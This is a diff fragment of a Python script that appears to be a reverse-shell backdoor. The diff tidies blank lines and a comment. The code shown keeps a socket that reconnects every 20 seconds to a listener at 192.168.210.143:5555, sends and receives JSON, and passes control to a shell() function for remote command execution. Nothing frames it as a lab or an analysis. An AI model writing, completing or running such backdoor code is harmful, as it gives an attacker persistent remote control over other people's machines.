@@ -10,12 +10,10 @@ import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 
-
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
     jsondata = json.dumps(data)  # Convert data to JSON format
     s.send(jsondata.encode())  # Send the encoded data over the network
-
 
 # Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
@@ -33,7 +31,7 @@ def connection():
     while True:
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
-            # Connect to a remote host with IP '192.168.1.12' and port 5555
+            # Connect to a remote host with Listener IP and port 5555
             s.connect(('192.168.210.143', 5555))
             # Once connected, enter the shell() function for command execution
             shell()
